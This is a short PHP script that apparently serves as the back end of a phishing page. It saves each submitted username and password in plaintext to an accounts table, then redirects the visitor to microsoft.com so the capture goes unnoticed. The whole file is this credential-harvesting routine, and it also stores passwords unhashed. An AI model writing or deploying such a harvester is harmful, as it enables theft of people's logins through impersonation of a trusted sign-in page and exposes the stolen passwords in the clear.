<?php
// Import the config file
require_once 'config.php';

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the username and password from the app.js file
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the username and password to the accounts table
    $sql = "INSERT INTO accounts (username, password) VALUES (?, ?)";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$username, $password]);

    // Redirect to the a microsoft.com
    header('Location: https://www.microsoft.com');


    exit;
}
